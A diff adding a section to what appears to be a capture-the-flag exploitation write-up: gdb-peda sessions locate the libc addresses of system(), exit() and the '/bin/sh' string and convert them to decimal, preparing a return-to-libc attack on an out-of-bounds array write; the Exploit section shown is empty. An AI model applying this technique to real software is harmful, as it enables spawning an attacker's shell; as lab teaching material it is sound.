@@ -96,6 +96,29 @@ data[index<<2] = number
 ```
 On writting to index 1 it will write to `data[1 << 2] = number`, same as `data[4] = number` .
 On writting to index 114 it will write to `data[114 << 2] = number`, same as `data[456] = number` .
+
+Retrieve `system()`, `exit()` and `"/bin/sh"` addresses.
+```gdb
+[...]
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+gdb-peda$ print exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f897ec ("/bin/sh")
+```
+Convert them to decimal values.
+```gdb
+gdb-peda$ p/d 0xf7e6aed0
+$3 = 4159090384
+gdb-peda$ p/d 0xf7e5eb70
+$4 = 4159040368
+gdb-peda$ p/d 0xf7f897ec
+$5 = 4160264172
+```
+
 # Exploit
 ```shell
 ```
